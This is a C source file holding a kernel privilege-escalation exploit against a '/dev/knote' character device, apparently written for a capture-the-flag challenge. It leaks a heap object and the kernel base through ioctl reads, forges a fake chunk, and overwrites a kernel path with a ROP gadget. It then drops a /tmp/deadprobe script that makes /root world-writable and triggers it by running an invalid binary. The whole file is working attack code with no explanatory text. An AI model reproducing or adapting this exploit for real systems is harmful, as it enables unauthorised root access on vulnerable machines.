#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>

struct knote_userl {
	unsigned long idx;
	char *data;
	size_t len;
};

int open_prog(){
	int fd = open("/dev/knote", O_RDONLY);
        if(fd < 0){
                printf("Error in OPEN\n");
		return -1;
        }else{
                printf("Success OPEN\n");
		return fd;
        }
}

void call_ioctl(int fd, int option, struct knote_userl ku){
	int ret = ioctl(fd, option, &ku);
        if(ret < 0){
                printf("Error in IOCTL\n");
        }else{
                printf("Success IOCTL\n");
        }
}

int main(void){
	struct knote_userl ku,ku2;
	unsigned long int *p, object_leak, buff[4], k_leak, k_base;
	int KNOTE_CREATE  = 0x1337;
	int KNOTE_DELETE  = 0x1338;
	int KNOTE_ENCRYPT = 0x133a;
	int KNOTE_DECRYPT = 0x133b;
        int KNOTE_READ    = 0x1339;
	int fd;

        fd = open_prog();
	

	// OBJECT 1
	ku.idx  = 0;
	ku.len  = 0x20;
	ku.data = 0xdeadbeefcafebabe;
	call_ioctl(fd, KNOTE_CREATE, ku);
	
	// OBJECT 2
	ku2.idx = 0;
	ku2.len = 0x20;
	ku2.data= malloc(0x20);


	// ABR
	p = (unsigned long int *)ku2.data;
	call_ioctl(fd, KNOTE_READ, ku2);
	object_leak = p[2];
	ku2.idx = 1;
	printf("OBJECT_LEAK = %lx\n", object_leak);

	/*

	 for(int i=0; i < (0x20/8);i++){
		printf("%lx\n",p[i]);
	 }

	*/


	// SET FAKE CHUNK
        buff[0] = object_leak;
        buff[1] = 0x900;
        buff[2] = 0;
        buff[3] = 0;
	memcpy(ku2.data,&buff,32);
	call_ioctl(fd, KNOTE_CREATE,ku2); 
	

	// LEAK ADDRESSES
	ku.idx = 0;
	ku.len = 0x900;
	ku.data = malloc(0x900);
	call_ioctl(fd, KNOTE_READ,ku);
	
	*p = (unsigned long int *)ku.data;

        /*

	  for(int i=0; i < (0x900/8);i++){
                printf("i: %d - %lx\n",i,p[i]);
          }

	*/

	// unsigned long int k_leak = p[133];
	k_leak = p[129];
	k_base = k_leak - 0x8372d0;
	printf("K_LEAK = 0x%lx \n",k_leak);
	printf("K_BASE = 0x%lx \n",k_base);
	call_ioctl(fd, KNOTE_DELETE, ku);
        call_ioctl(fd, KNOTE_DELETE, ku2);


	// ROP TO ABW
	ku.idx  = 0;
        ku.len  = 0x20;
        ku.data = 0xdeadbeefcafebabe;
	call_ioctl(fd, KNOTE_CREATE, ku); // --> trigger free

	ku2.idx = 1;
        ku2.len = 0x20;
        ku2.data= malloc(0x20);
	buff[0] = 0x6165642f706d742f; // /tmp/dead
	buff[1] = k_base + 0x837bc0;
	buff[2] = k_base + 0x04b7c; // -> gadget
	buff[3] = 0;
	memcpy(ku2.data,&buff,32);

	call_ioctl(fd, KNOTE_CREATE, ku2);
	call_ioctl(fd, KNOTE_ENCRYPT, ku); // -> exec gadget
	call_ioctl(fd, KNOTE_DELETE, ku2);


	system("echo -e '#!/bin/sh\nchmod 777 /root' > /tmp/deadprobe");
        system("chmod +x /tmp/deadprobe");
        system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
        system("chmod +x /tmp/pwn");
        system("/tmp/pwn");




	return 0;
}
